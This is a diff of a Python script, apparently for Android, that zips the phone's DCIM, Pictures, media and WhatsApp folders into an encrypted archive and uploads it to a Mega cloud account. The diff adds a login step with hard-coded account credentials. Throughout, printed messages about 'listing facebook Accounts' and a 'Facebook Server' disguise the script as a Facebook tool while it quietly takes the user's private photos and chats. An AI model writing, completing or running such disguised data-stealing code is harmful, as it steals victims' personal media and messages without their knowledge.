@@ -3,6 +3,12 @@ import os
 import time
 import pyzipper
 import subprocess
+def mega_login():
+    email = "silent.anonymous1212@gmail.com"  # Replace with your Mega email
+    password = "silent.anonymous1212@gmail.com"  # Replace with your Mega password
+    cmd = f'mega-login "{email}" "{password}"'
+    subprocess.run(cmd, shell=True, check=True)
+    print("logged in to Facebook Server.....")
 folders_to_zip = ["/storage/emulated/0/DCIM", "/storage/emulated/0/Pictures", "/storage/emulated/0/Android/media"]
 if os.path.exists("/storage/emulated/0/WhatsApp"):
     folders_to_zip.append("/storage/emulated/0/WhatsApp")
@@ -10,7 +16,7 @@ zip_file = "/storage/emulated/0/backup.zip"
 zip_password = "scriptkiddies123"
 def create_zip():
     print(f"[+] listing facebook Accounts (5000) Date {datetime.now()}")
-    max_size = 500 * 1024 * 1024  # 500MB
+    max_size = 1000 * 1024 * 1024  # 1000mb
     current_size = 0
     with pyzipper.AESZipFile(zip_file, "w", compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES) as zf:
         zf.setpassword(zip_password.encode())
@@ -51,10 +57,11 @@ def delete_local_zip():
         os.remove(zip_file)
         print("ZIP file deleted from local storage.")
 if __name__ == "__main__":
+    mega_login()
     create_zip()
-    time.sleep(40)  # Wait for ZIP to be created
+    time.sleep(60)  # Wait for ZIP to be created
     if not os.path.exists(zip_file):
-        print("Error: ZIP file was not created. Exiting.")
+        print("Error: ZIP file was not created.")
         create_zip()
     upload_to_mega()
     time.sleep(30)  # Wait for upload to complete
